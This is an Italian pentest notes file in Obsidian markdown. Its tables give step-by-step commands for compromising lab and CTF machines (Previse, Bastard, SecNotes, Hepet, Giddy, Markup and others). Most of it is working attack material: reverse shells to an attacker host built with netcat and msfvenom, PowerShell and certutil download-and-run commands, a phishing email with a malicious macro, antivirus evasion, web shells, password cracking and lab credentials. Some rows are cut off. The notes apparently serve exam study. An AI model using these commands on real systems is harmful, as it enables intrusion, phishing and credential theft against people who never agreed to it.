| üß† **Azione**                      | üíª **Comando / Metodo**                                                                                                                                          | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                                     |
| ---------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Execution After Redirect (EAR)** | 1. `Burpsuite`<br>2. `Intercept ON`<br>3. `Intercept response this request`<br>4. `302 ==> 200 OK`                                                               | Catturiamo la richiesta ad una pagina che sarebbe reindirizzata da un'altra parte (es: `accounts.php`) e modifichiamo la risposta che andrebbe al server da `302` a `200 OK`. Il server non sospetta che la richiesta possa essere stata modificata e quindi siamo entrati                                                                                |
| **Utente nuovo**                   |                                                                                                                                                                  | Registriamo un nuovo utente `hacker:hacker` cos√¨ da avere un'utenza valida                                                                                                                                                                                                                                                                                |
| **RCE**                            | 1. `grep '$_POST'`<br>2. `;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|sh -i 2>&1\|nc IP_KALI PORT >/tmp/f`                                                              | Scarichiamo un file presente sull'applicazione dove sono presenti tutte le pagine PHP. Con la *1.* cerchiamo tra i file un punto in cui l'utente pu√≤ inserire codice e troviamo in `logs.php`:<br>`$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");`<br>Identifichiamo dove inserire l'input ed avviamo una reverse shell |
| **Cracking**                       | 1. `mysql -uroot -p`<br>2. `echo "m4lwhere:$1$üßÇllol$DQpmdvnb7EeuO6UaqRItf." > hash.txt`<br>3. `hashcat -m 500 --user hash.txt /usr/share/wordlists/rockyou.txt` | Una volta dentro troviamo le credenziali `root:mySQL_p@ssw0rd!:)` db in `config.php`; le sfruttiamo per accedere al DB interno. <br><br>Troviamo le credenziali `m4lwhere:$1$üßÇllol$DQpmdvnb7EeuO6UaqRItf.` dunque le cracchiamo<br>                                                                                                                      |
| **Root**                           | 1. `sudo -l`<br>2. `PATH=/tmp:$PATH`<br>3. `cd /tmp`<br>4. `echo "/bin/bash" > gzip`                                                                             | Una volta entrati con `m4lwhere:ilovecody112235!` notiamo che abbiamo abbastanza permessi per eseguire programma con sudo. Il programma utilizza la funzione `gzip` dunque possiamo cambiare il percorso del binario per utilizzarne uno modificato che avvii una shell                                                                                   |
- [writeup](https://cloverophile.medium.com/hackthebox-previse-write-up-fb2e1f0635f4)
### ServerMon

| üß† **Azione**         | üíª **Comando / Metodo**                                                     | üìù **Output / Scopo**                                                                                                                                                                              |
| --------------------- | --------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **FTP**               | 1. `ftp IP_TARGET`<br>2. `mget *`                                           | In ftp scarichiamo file che ci fano capire che l'utente *Nathan* conserva un file di nome *Passwords.txt* sul desktop                                                                              |
| **NMS100**            | 1. `python3 exploit.py IP_TARGET C:\Windows\Users\Nathan\|Password.txt`<br> | Troviamo che *NVMS-1000* √® vulnerabile a [Path Traversal](https://github.com/AleDiBen/NVMS1000-Exploit/blob/master/nvms.py) dunque lo utilizziamo per leggere le password della sezione precedente |
| **SSH**               | `hydra -L users.txt  -P Passwords.txt -t 6 ssh://IP_TARGET`<br>             | *Nadine* ha accesso a SSH                                                                                                                                                                          |
| **NSClient++**        | `type C:\Program File\nsclient\nsclient.ini`                                | In *C:\Program File\nsclient\nsclient.ini* sono presenti le credenziali per il servizio `NSClient++` esposto sulla porta 8443 che inaccessibile dall'esterno.                                      |
| **Forward tunneling** | `ssh -L PORT_KALI:127.0.0.1:PORT_TARGET user@IP_TARGET`                     | Forwordiamo la porta 8443 sulla nostra macchina locale cos√¨ da potervi accedere. Inseriamo la password                                                                                             |
|                       |                                                                             | **CERCARE WIRETUP PER CONTINUO**                                                                                                                                                                   |
- [writeup](https://0xdf.gitlab.io/2020/06/20/htb-servmon.html)
### Bastard

| üß† **Azione**   | üíª **Comando / Metodo**                                                                                                                                                                                                                                                                                                                                                                                                                              | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                                                    |
| --------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **Drupal 7.54** | 1. `nc lvnp 4444`<br>2. `python3 -m http.server 8000`<br>3. `wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1`<br>4. *AGGIUNGERE ALL'ULTIMA RIGA:* `Invoke-PowerShellTcp -Reverse -IPAddress IP_KALI -Port PORT`<br>5. `python2 drupalgeddon2.py -h http://IP_KALI -c "powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://IP_KALI:8000/Invoke-PowerShellTcp.ps1')"` | Scopriamo che *Drupal 7.54* visitando il file `/CHANGELOG.TXT` e che √® vulnerabile a [RCE](https://raw.githubusercontent.com/lorddemon/drupalgeddon2/refs/heads/master/drupalgeddon2.py) o [RCE](https://github.com/pimps/CVE-2018-7600?source=post_page-----fcc9e6b7e3d7---------------------------------------)                                                        |
| **MS10-059**    | 1. `certutil -split -urlcache -f http://IP_KALI:8000/Chimicurri.exe`<br>2. `nc -lvnp 4444`<br>3. `./Chimicurri.exe IP_KALI 4444`                                                                                                                                                                                                                                                                                                                     | Utilizziamo windows suggester per saper quale vulnaerabilit√† √® affetto. E' vulnerabile a [MS10-059]([https://github.com/egre55/windows-kernel-exploits/tree/master/MS10-059:%20Chimichurri/Compiled](https://github.com/egre55/windows-kernel-exploits/tree/master/MS10-059:%20Chimichurri/Compiled)) scarichiamo sulla macchina vittima *Chimicurri.exe* e lo eseguiamo |

- [writeup](https://systemweakness.com/bastard-walkthrough-hack-the-box-fcc9e6b7e3d7)
## XSS

### SecNotes

| üß† **Azione**     | üíª **Comando / Metodo**                                                                                                                                                                                                                          | üìù **Output / Scopo**                                                                                                                                                                                                                                                       |
| ----------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **XSS**           | `http://IP_DOMAIN/newpass.php/pass=1234&confirmpass=1234`                                                                                                                                                                                        | Ci registriamo nell'applicazione con un account, poi inseriamo nel form `/contact.php` la *1.* per registrare una nuova password `1234` all'amministratore e poi entriamo. Al suo interno troviamo dell credenziali                                                         |
| **SMB**           | 1. `smbmap -H IP_TARGET -u tyler -p '92g!mA8BGjOirkL%OG*&'`<br>2. `smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&' //IP_TARGET/new-site`<br>3. `put rev_shell.php`<br>4. `put nc64.exe`<br>5. `/rev_shell.php?cmd=nc64.exe IP_KALI 9001 -e powershell` | Mostriamo le cartelle condivise con la *1.*, entriamo con la *2.* e notiamo che possiamo inserire file con la *3.*. Inseriamo una reverse shell `<?php system($_GET['cmd']) ?>`                                                                                             |
| **Administrator** | 1. `net use \\127.0.0.1\c$ /user:administrator "u6!4ZwgwOM#^OBf#Nwnh"`<br>2. *KALI:* `winexe -U '.\administrator%u6!4ZwgwOM#^OBf#Nwnh' //IP_TARGET cmd.exe`<br><br>                                                                              | Nella cartella dell'utente troviamo un file `bash.lsk` che avvia una *WSL1*. All'interno della VM troviamo vecchi comandi su `.bash_history` tra cui delle credenziali a smb. Proviamo quelle credenziali in windows con la *1.* e poi diventiamo Administrator con la *2.* |

- [writeup](https://medium.com/infosec-watchtower/hackthebox-write-up-secnotes-f235ce8c4018)


## Proxy

### Squid

| üß† **Azione**        | üíª **Comando / Metodo**                 | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| -------------------- | --------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Squid Proxy**      | 1. ![[Pasted image 20250904004828.png]] | Dalla scansione notiamo che sulla porta `3128` gira il servizio *Squid Proxy*. Utilizziamo questo [[proxy-curl.sh]] per enumerare le porte interne non raggiungibili dall'esterno. Scopriamo che la porta `8080` √® aperta, dunque facciamo come nella *1.* per attivare il proxy e raggiungerla                                                                                                                                                                                                                                        |
| **PhpMyAdmin 5.0.2** | 1. ![[Pasted image 20250904010305.png]] | Sulla porta appena raggiunta troviamo il servizio *PhpMyAdmin 5.0.2* che √® accessibile con le credenziali di default `root:BLANK`.<br>Creiamo su SQL > TAB un query come nella *1.* utilizzando questo [script](https://gist.github.com/BababaBlue/71d85a7182993f6b4728c5d6a77e669f) per creare un file di nome `uploader.php` nella webroot. In seguito navighiamo il file in `http://IP_TARGET/uploader.php` e notiamo che √® eseguito. Con lo stesso principio possiamo avviare una reverse shell PHP, quindi ripetiamo il processo. |

- [writeup](https://medium.com/@Dpsypher/proving-grounds-practice-squid-1bc1e2dbb8d4)

## Phishing

### Hepet

| üß† **Azione**          | üíª **Comando / Metodo**                                                                                                                                                                                                                                                                              | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                                                                                              |
| ---------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **SMTP Enumeration**   | 1. `smtp-user-enum -M VRFY -U users.txt -t IP_TARGET`                                                                                                                                                                                                                                                | Troviamo esposto pubblicamente una pagina con tutto il team. Stiliamo una lista di nomi ed utilizziamo la *1.* sulla porta `25` per assicurarci che esistano. Con un bruteforce scopriamo che le credenziali `jonas:SicM                                                                                                                                                                                           |
| **Phifhing VBA Macro** | 1. `msfvenom -p windows/shell_reverse_tcp LHOST=IP_KALI LPORT=1337 -f hta-psh -o evil.hta`<br>2. `python3 less_long.py evil.hta`<br>3. `sendemail -f 'jonas@localhost' \ -t 'mailadmin@localhost' \ -s IP_TARGET:25 \ -u 'Your spreadsheet' \ -m 'Here is your requested spreadsheet' \ -a bomb.ods` | Poich√© abbiamo l'accesso con un utente, inviamo una mail id phishing tramite file `.ods`. Utilizziamo la *1.* per creare una reverse shell di nome `evil.hta`, codifichiamo in base64 l'exploit, riduciamo la sua lunghezza con questo script [[less_long.py\| less_long.py]], utilizziamo la *2.* per accocciarlo. Carichiamo lo sript malevolo sul file `.ods` tamite LibreOffice. Infine, inviamolo con la *3.* |
| **Writing on file**    | 1. `wmic service get name,displayname,pathname,startmode \| findstr /i "auto"`<br>2. `sc qc VeyonService`<br>3. *KALI* `msfvenom -p windows/shell_reverse_tcp LHOST=IP_KALI LPORT=1337 -f exe -o veyon-service.exe`<br>4. `shutdown /r`                                                              | Analizziamo i servizi installati con la *1.*  scopriamo che √® presente `VeyonService` e con la *2.* scopriamo che abbiamo i permessi per sovrascriverlo. Creiamo una reverse shell con la *3.* e poi carichiamola al posto del servizio. Con la *4.* riavviamo il pc ed attendiamo che si connetta                                                                                                                 |


- [writeup](https://banua.medium.com/proving-grounds-hepet-oscp-prep-2025-practice-17-3bdc3ad86495)
## Buffer Overflow

### Internal

| üß† **Azione**       | üíª **Comando / Metodo**                                                                                                                | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                       |
| ------------------- | -------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Buffer Overflow** | 1. `msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP_KALI LPORT=LPORT  EXITFUNC=thread -f python`<br>2. `python2 poc.py IP_TARGET` | Con una scansione notiamo la porta `5357` con servizio `Microsoft HTTPAPI httpd 2.0`. Googlando il servizio troviamo che √® vulnerabile a [BoF](https://www.exploit-db.com/exploits/40280). Utilizziamo la *1.* per generare una reverse shell sulla nostra porta e copiarlo al posto del contenuto del file |
| **msfconsole**      | 1. `search ms09-050`                                                                                                                   | Il tool fallisce dunque utilizziamo `msfconsole`. Usiamo la *1.* per cercare l'exploit e poi inseriamo i campi                                                                                                                                                                                              |

- [writeup](https://medium.com/@Dpsypher/proving-grounds-practice-internal-e5098dd29793)


## SMB

### Relevant

| üß† **Azione**            | üíª **Comando / Metodo**                                                                                                                                                                                                                                                                                                                | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| ------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **SMB scrittura**        | 1. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP_KALI LPORT=1234 -f aspx -o exploit.aspx`<br>2.![[Pasted image 20250801151016.png]]                                                                                                                                                                                              | Possiamo caricare file sul servizio *SMB* allora tentiamo di caricare una reverse shell e poi attivarla navigandola. Creiamo la reverse shell con la *1.*. Andiamo sulla porta `49663` per navigarla come nella *2.*<br><br>NB: spesso le cartelle samba sono navigabili dall'esterno perci√≤ siamo riusciti nell'exploit                                                                                                                                                                                                                                     |
| **Privilege escalation** | 1. `whoami /all`<br>2. `certutil -urlcache -split -f http://IP_KALI:80/JuicyPotato.exe`<br>3. `msfvenom -p windows/shell_reverse_tcp LHOST=IP_KALI LPORT=5555 -f exe > reverse.exe`<br>4. `certutil -urlcache -split -f http://10.21.210.203:80/reverse.exe`<br>5. `nc -lvnp 5555`<br>6. `JuicyPotato.exe -l 5555 -t * -p reverse.exe` | L'utente attuale ha il flag `SeImpersonatePrivilege` abilitato, ci√≤ significa che vulnerabile secondo [hacktricks](https://book.hacktricks.wiki/es/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html). Su kali scarico [JuicyPotato.exe](https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe) poi la carico sulla macchina vittima con la *2.*. Creo con la *3.* una nuova reverse shell con una nuova porta in ascolto. La carico sul target con la *5.* e metto in ascolto con la *6.* |

- [writeup](https://medium.com/@rizzziom/relevant-walkthrough-tryhackme-a928d49becb4)


### Weasel

| üß† **Azione**             | üíª **Comando / Metodo**                                                                                                                                                                                                                                                                                                       | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                    |
| ------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
|                           | **SMB                                                                                                                                                                                                                                                                                                                         | Enumerando *SMB* troviamo il file `jupyter-token` e lo scarichiamo. Con un fuzzing directories troviamo il percorso `/login` dove √® presente una pagina di login di *Jupyter* ed √® possibile inserire un token. Inseriamo quello appena trovato e ci riporta in una nuova pagina                                                         |
| **Jupyter Terminal**      | 1. `chmod 600 id_rsa`<br>2. `ssh -i id_rsa dev-datasci-lowpriv@IP_TARGET`<br>3. `powershell`                                                                                                                                                                                                                                  | Andando su NEW=>TERMINAL accediamo ad un terminale dove abbiamo il controllo della macchina con l'utente `dev-datasci`. Troviamo una chiave privata  SSH. Usiamo la *1.* e la *2.* per entrare con la chiave SSH appena trovata infine la *3.* per avviare la Powershell                                                                 |
| **Tool**                  | 1. `iwr http://IP_KALI/PrivescCheck.ps1 -OutFile C:\Users\dev-datasci-loxpriv\Desktop\PrivescCheck.ps1`<br>2. `.\PrivescCheck.ps1; Invoke-PrivescCheck`                                                                                                                                                                       | Carichiamo con la *1.* il tool per enumerare la macchina per privesc e con la *2.* la avviamo. Troviamo la vulnerabilit√† *AlwaysinstallElevated* secondo questo [articolo](https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/?source=post_page-----d7638cb4ecad---------------------------------------). |
| **AlwaysinstallElevated** | 1. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP_KALI LPORT=1234 -f msi -o exploit.msi`<br>2. `iwr http://IP_TARGET/exploit.msi -OutFile C:\Users\dev-datasci-lowpriv\Desktop\exploit.msi`<br>3. `nc -lvnp 1234`<br>4. `runas /u:dev-datasci-lowpriv "msiexec /qn /i C:\Users\dev-datasci-lowpriv\Desktop\exploit.msi"` | Creiamo una reverse shell `.msi` con la *1.*, carichiamola con la *2.* ed avviamola con la *4.*                                                                                                                                                                                                                                          |


- [writeup](https://medium.com/@rizzziom/weasel-walkthrough-tryhackme-d7638cb4ecad)


### AllSigns2pwnAge

| üß† **Azione**            | üíª **Comando / Metodo**                                                   | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                                                                                                            |
| ------------------------ | ------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **SMB scrivibile**       | 1. `put rev.php`                                                          | Notiamo che il servizio *SMB* √® scrivibile e che √® navigabile tramite la cartella `/images`. Inseriamo una reverse shell in PHP con la *1.* e navighiamola.<br><br>NB: sola la reverse shell di Ivan Sincek di [revshells.com](revshells.com) ha funzionato (stiamo usando *XAMPP*)                                                                                                                                              |
| **Install file**         |                                                                           | Guardiamo il contenuto del file `Install_www_and_deploy.bat` dove troviamo le credenziali `administrator:fdsaklfdso`                                                                                                                                                                                                                                                                                                             |
| **logon registry**       | 1. `reg "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"`     | Utilizziamo la *1.* per vedere le credenziali salvate durante l'autologin                                                                                                                                                                                                                                                                                                                                                        |
| **Ultravnc credentials** | 1. ![[Pasted image 20250801213737.png]]<br>2. `vncpwd.exe "ultravnc.ini"` | Guardando il contenuto del file `C:\Program Files\uvnc bvba\UltraVNC\ultravnc.ini` troviamo le credenziali di un altro utente come in *1.*. Poich√© sono codificati dobbiamo scaricare *VNC password decoder 0.2.1* da questo [link](https://aluigi.altervista.org/pwdrec.htm?source=post_page-----73cf842c0106---------------------------------------), carichiamola tramite *SMB* come per la revshell ed avviamolo con la *2.* |

- [writeup](https://medium.com/@rizzziom/allsigns2pwnage-walkthrough-tryhackme-73cf842c0106)

## SNMP

### Year Of The Owl

| üß† **Azione**    | üíª **Comando / Metodo**                                                                                         | üìù **Output / Scopo**                                                                                                                                                                            |
| ---------------- | --------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **SNMP**         | 1. `nmap -sU IP_TARGET -p 161`<br>2. `snmpwalk -v 2c -c openview IP_TARGET 1.3.6.1.4.1.77.1.2.25`               | Utilizzando il comando *1.* notiamo che utilizza la porta `161` per il servizio *SNMP*. Applichiamo la *2.* per enumerare gli utenti. Troviamo l'utente `jareth`                                 |
| **Bruteforce**   | 1. `hydra -l jareth -P rockyou.txt rdp://IP_TARGET`<br>2. `evil-winrm -i IP_TARGET -u USER -p PASS`             | Utilizziamo la *1.* per fare bruteforce sul servizio *RDP* e troviamo le credenziali `jareth:sarah`. Usiamo la *2.* per entrare dentro la macchina con le nuove credenziali                      |
| **$Recycle.Bin** | 1. `whoami /all`<br>2. `cd 'C:\$Recycle.Bin\SID'`<br>3. `download sam.bak`<br>4. `download system.bak`          | Utilizziamo la *1.* per conoscere il nostro SID e la *2.* per entrare nel proprio cestino. Al suo interno sono presenti i file `system.bak` e `sam.bak`. Scarichiamoli in locale con *3.* e *4.* |
| **SAM.bak**      | 1. `impacket-secretsdump -sam sam.bak -system system.bak LOCAL`<br>2. `evil-winrm -u IP_TARGET -u USER -H NTLM` | Con la *1.* otteniamo gli NTLM degli utenti tra cui l'amministratore. Utilizziamo la *2.* per entrare come amministratore                                                                        |

- [wirteup](https://medium.com/@hexshubz/tryhackme-walkthrough-year-of-the-owl-b0c8e59c8284)

## SQL Injection

### Giddy

| üß† **Azione**               | üíª **Comando / Metodo**                                                                                                                                                                        | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                                                                                |
| --------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **SQL Injection NTLM Hash** | 1. `impacker-smbserver hack $(pwd)`<br>2. `; use master; exec xp_dirtree '\\IP_KALI\hack';--`<br>3. `john hash --wordlist=rockyou.txt`                                                         | Dopo un fuzzing directories sulla porta `80`, scopriamo il percorso `/mvc` dove i parametri sono vulnerabili a *SQLi*. <br>Apriamo una connessione con la *1.*, inseriamo come injection la *2.* ed otteniamo l'NLTM Hash dell'utente del servizio che cracchiamo con la *3.*.                                                                                                                       |
| **Unifivideo**              | 1. `msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP_KALI LPORT=443 -f exe -o taskkill.exe`<br>2. `Stop-Service -Name UniFivideoService`<br>3. `Start-Service -Name UniFivideoService`<br> | Con l'utenza trovata nel passaggio precedente effettuiamo l'accesso sul servizio *Windows Powershell Web Access*.<br>Notiamo che √® presente il programma `unifivideo` che scopriamo vulnerabile a [privesc](https://www.exploit-db.com/exploits/43390). <br>Come nella guida creiamo una reverse shell con la *1.*, carichiamo il payload e poi proviamo a riavviare il servizio con la *2.* e *3.*. |
| **Firewall Evasion**        | 1. ![[Pasted image 20250901165525.png]]<br>2. `user evasion/windows/windows_defender_exe`<br>3. `Stop-Service -Name UniFivideoService`<br>4. `Start-Service -Name UniFivideoService`           | Purtroppo, come vediamo dalla *1.*, il firewall blocca l'esecuzione della reverse shell. Per evadere il firewall creiamo una reverse shell evasiva con `msfvenom` con la *2*, carichiamo la nuova shell ed applichiamo i passaggi di prima *3.* e *4.*                                                                                                                                               |

- [writeup](https://www.hackingarticles.in/hack-the-box-giddy-walkthrough/)

### MedJed

| üß† **Azione**            | üíª **Comando / Metodo**                                                                                                                                                                                                                                                     | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                      |
| ------------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **PHP info **            |                                                                                                                                                                                                                                                                             | Sulla porta `45332` trovo il file `phpinfo.php` dove scopro che la webroot `C:/xampp/htdoc                                                                                                                                                                                                                                                 |
| **SQL Injcetion**        | 1. ![[Pasted image 20250904233221.png]]<br>2. ![[Pasted image 20250904235936.png]]                                                                                                                                                                                          | Scopriamo che la porta `33033` √® aperta e troviamo un servizio di login esposto. Ci registriamo ed entriamo dentro e troviamo un parametro vulnerabile a *SQL Injection* e lo notiamo dalla *1.*.<br>Utilizziamo la *2.* per inserire un file `cmd.php` ile ed infine navighiamo la *3.* `cmd.php?cmd=whoami`                              |
| **Reverse Shell**        | 1. `msfvenom -p windows/x64/shell_reverse_tcp -f exe -o rev.exe LHOST=IP_KALI LPORT=8000`<br>2. ![[Pasted image 20250905001221.png]]<br>3. ![[Pasted image 20250905001241.png]]                                                                                             | Creiamo con la *1.* per creare una reverse shell, carichiamola sul nostro target come con la *2.* ed avviamola con la *3.*                                                                                                                                                                                                                 |
| **Barracuda Drive v6.5** | 1. *KALI* `msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP_KALI LPORT=445 -f exe -o bd.exe`<br>2. *TARGET* `move C:\bd\bd.exe C:\bd\bd.exe.bak`<br>3. *TARGET* `certutil -f -urlcache -split C:\bd\bd.exe`<br>4. *KALI* `nc -lvnp 445`<br>5. *TARGET* `shutdown /r -t 5` | Sulla porta `44330` scopriamo il servizio *Barracuda Drive v6.5* che √® vulnerabile a [privesc](https://www.exploit-db.com/exploits/48789) .<br>Creiamo una reverse shell con la *1.*, poi rinominiamo il file con la *2.*, carichiamo `bd.exe` sulla macchina con la *3.* e riavviamo la macchina per avviare la reverse shell con la *5.* |

- [writeup](https://medium.com/@bdsalazar/proving-grounds-medjed-intermediate-windows-box-writeup-a-journey-to-offensive-security-74a2b7a94a88)

## Telnet

### Access

| üß† **Azione**         | üíª **Comando / Metodo**                                                                                                                                                                                                                                         | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                                                                                 |
| --------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **MDB**               | 1. `mdb-tables backup.mdb`<br>2. `mdb-export backup.mdb auth_user`                                                                                                                                                                                              | Effettuando l'accesso con le credenziali anonime sul servizio FTP troviamo il file di backup di un database `backup.mdb`. Utilizziamo la *1.* per vedere le tabelle presenti e la *2.* per visualizzarne una specifica                                                                                                                                                                                |
| **PST File**          | 1. `7z x FILE.ZIP`<br>2. `telnet IP_TARGET`                                                                                                                                                                                                                     | Utilizziamo la *1.* per unzippare il secondo file scaricato ed inseriamo la password trovata nel file `.mdb`, `access4u@security`.<br>Dopo l'estrazione appare un file in formato `.pst` che possiamo leggere tramite [PST Viewer](https://goldfynch.com/pst-viewer/), dove troviamo ulteriori credenziali. Utilizziamo la *2.* per effettuare l'accesso a *Telnet* con le credenziali appena trovate |
| **Saved Credentials** | 1. `cmdkey /list`<br>2. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP_KALI LPORT=443 -f exe -a x86 -o shell.exe`<br>3. `certutil -f -urlcache http://IP_KALI/shell.exe shell.exe`<br>4. `nc -lvnp 443`<br>5. `runas /user:ACCESS\Administrator shell.exe` | Con la *1.* vediamo se ci sono salvate credenziali nel sistema e troviamo quelle dell'amministratore. Con le credenziali salvate potremmo avviare programmi senza necessariamente conoscere la password.<br>Creiamo una shell con la *2.*, carichiamola con la *3.* ed avviamola con la *5.*                                                                                                          |

- [writeup](https://systemweakness.com/htb-access-machine-walkthrough-explanation-6aad9d9ea80f)

## XML Attack

### Markup

| üß† **Azione**     | üíª **Comando / Metodo**                                                                                                                                                      | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| ----------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **XML Injection** | 1. ![[Pasted image 20250822114557.png]]                                                                                                                                      | Sulla porta `80` troviamo un input che se catturato invia richieste XML. Modifichiamo la richiesta come nella *1.* per ottenere la chiave SSH di un utente.                                                                                                                                                                                                                                                                                                                                                            |
| **Cronjob**       | 1. `ps`<br>2. `icalcs job.bat`<br>3. `curl http://IP_KALI/nc64.exe -o nc64.exe`<br>4. `echo C:\Log-Management\nc64.exe -e cmd.exe IP_KALI LPORT > C:\Log-Management\job.bat` | Ispezionando il contenuto del file `C:\Log-Management\job.bat` notiamo che utilizza il modulo `wvutil.exe` che spesso √® utilizzato per cronjobs. Controlliamo con la *1.* per avere conferma che faccia parte di eventi iterativi.<br>Con la *2.* notiamo che abbiamo `F` permessi sul file quindi possiamo modificarlo in modo da avviare una reverse shell.<br>Scarichiamo `nc64.exe` sulla macchina con la *3.*, infine aggiungiamo il comando al file compromettibile con la *4.* ed attendiamo che venga eseguito |



- [writeup](https://medium.com/@mefire023/markup-htb-walkthrough-85dfc99eac15)

## Others

### Chatterbox

| üß† **Azione**     | üíª **Comando / Metodo**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 | üìù **Output / Scopo**                                                                                                                                                                                                                          |
| ----------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Achat**         | `searchsploit -m 36035.py`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              | Scansionando la macchina ci rendiamo conto che gira il servizio `Achat` su `9256` e cercando su `searchsploit` troviamo il file `36025.py`                                                                                                     |
